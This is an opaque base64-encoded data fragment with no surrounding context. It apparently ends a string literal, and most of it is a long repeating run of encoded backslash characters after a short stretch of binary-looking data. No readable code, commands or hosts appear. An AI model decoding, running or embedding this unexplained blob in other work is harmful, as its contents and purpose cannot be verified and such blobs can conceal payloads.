ZfJn8mF0cWF88XFxcXJxsnPydTJ6Mm2yb7JhslOyV3JX8ltyDnL+MvNyo3KTMpPyk7KScpIykvKSspVylTKV8pWylHKUMpTylLKXcpcyl/KXspZyljKW8paymXKZMpnymbKYcpgymPKYsptymzKb8puymnKaMprymrKdcp0ynfKc8pyyn3KfMp/yn7Kecp4ynvKespFygTKB8oGygHKAMoDygLKDcoMyg/KDsoJygjKC8oKyhXKFMoXyhbKEcoQyhPKEsodyhzKH8oeyhnKGMobyhrKJco9yjnKBcXF3cWF0sXFxcXJwcnNydTJ0cnQydPJ0sndydzJ5MnnyebJ4cngyePJ4sntyezJ78nryerJ9cn0yffJ9snxyfDJ88nyyf/J/sn5yfjJ+8n6ycXJhMmHyYbJgcmFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxc="
